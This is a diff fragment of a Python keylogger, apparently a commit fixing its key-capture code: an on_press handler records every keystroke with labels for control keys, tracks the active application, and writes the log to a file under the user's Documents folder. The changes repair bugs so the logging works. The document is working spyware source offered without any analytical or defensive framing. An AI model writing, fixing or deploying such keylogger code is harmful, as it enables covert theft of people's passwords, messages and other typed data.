@@ -19,6 +19,7 @@ logged_data.append(msg)
 old_app = ''
 delete_file = []
 
+
 def on_press(key):
     global old_app
 
@@ -36,12 +37,13 @@ def on_press(key):
 	'[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
 	'[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']
     
-    key = key(key).strip('\`')
+    key = str(key).strip('\'')
 
-    if key in substition:
+    if key in substitution:
         logged_data.append(substitution[substitution.index(key)+1])
     else:
         logged_data.append(key)
+
 
 def write_file(count):
     one = os.path.expanduser('~') + '/Documents/'
@@ -58,6 +60,7 @@ def write_file(count):
 
     with open(file, 'w') as fp:
         fp.write(''.join(logged_data))
+
 
 """temporary function to stop listening when esc is pressed"""
 def on_release(key):
